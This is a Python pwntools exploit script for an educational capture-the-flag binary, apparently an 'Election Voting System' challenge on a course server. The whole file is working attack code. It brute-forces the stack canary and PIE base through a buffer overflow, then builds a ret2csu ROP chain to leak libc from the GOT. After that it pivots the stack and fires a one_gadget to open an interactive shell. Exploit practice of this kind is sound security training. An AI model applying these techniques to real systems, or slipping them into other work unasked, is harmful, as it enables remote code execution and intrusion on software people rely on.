from pwn import *

local = False
elf = 'election' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10180
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc.so')
raw_input("aaa")

s = '''
+-------------------------------------------+
|    EDU 2019 Election Voting System v1.0   |
+-------------------------------------------+
'''

r.recv()
r.send('2')
r.recvuntil(': ')
r.send( 'a' * 184 )

msg = '\x00'
for i in range(15) :
    print i
    for count in range(256) :
        a = r.recvuntil('>')
        print count
        if (a[ len(s) + 2  ] == 'V') :
            r.send('3')
            msg = msg + chr(count - 1)
            count = 0
            break
        r.send('1')
        r.recvuntil(': ')
        sm =  'a' * 184 + msg + chr(count)
        r.send( sm )
        count +=1
cannary = u64(msg[:8])
pie = u64(msg[8:16]) - 0x1140
success("cannary -> %s" ,  hex(cannary))
success("pie_base -> %s" ,  hex(pie))

pop_rdi = 0x11a3 + pie
buf = 0x202160 + pie
got_start_main = 2105312 + pie
plt_put = 2368 + pie
plt_read  = 2432 + pie
leave_ret = 0x0000000000000be9 + pie
main = 0x000000000000 + pie
vote = 0x000000000000d7f + pie
write = pie + 0x202700
pop_rsi_r15 = 0x00000000000011a1 + pie
csu_down = 0x119a + pie
csu_up = 0x1180 + pie
success("buf -> %s" ,  hex(buf))
# max = 255
for j in range(25):
    r.recvuntil('>')
    r.send('2')
    r.recvuntil(': ')
    r.send('1')
    r.recvuntil('>')
    r.send('1')
    r.recvuntil(': ')
    r.send('1')
    for i in range(10):
        r.recvuntil('>')
        r.send('1')
        r.recvuntil(': ')
        r.send('0')
    r.recvuntil('>')
    r.send('3')
r.recvuntil('>')
r.send('2')
r.recvuntil(': ')
ban = 0xc67 + pie
ret = 0x906 + pie
rop1 = flat (
    write ,
    pop_rdi , 
    got_start_main,
    plt_put ,
    csu_down,
    0, #rbx=0
    1, #rbp=1
    buf + 120, #r12 call
    0, #r13
    buf, #r14=rsi
    200, #r15=rdx
    csu_up,
    0, #bypass rsp+4
    0, #rbx
    1, #rbp
    ret, #r12 also r12call
    0, #r13
    0, #r14
    0, #r15
    pop_rdi,
    0,
    plt_read,
)
r.send( rop1 )
r.recvuntil('>')
r.send('1')
r.recvuntil(': ')
r.send( rop1 )
for i in range(5):
    r.recvuntil('>')
    r.send('1')
    r.recvuntil(': ')
    r.send('0')
r.recvuntil('>')
r.send('2')
r.recvuntil(': ')
r.send( '0' )
r.recvuntil(': ')
r.send( 'a' * 0xe8 + p64(cannary) +  p64(buf) + p64(leave_ret)[0:5])
r.recvuntil('>')
r.send('3')
r.recv()
l.address = u64( r.recv(6) + '\0\0' ) - 0x21ab0
success( 'libc_bass -> %s ' , hex( l.address ))
one_gadget = l.address + 0x4f322
rop2 = flat(
    'b'*176,
    one_gadget
)
r.recv()
r.send(rop2)
r.interactive()
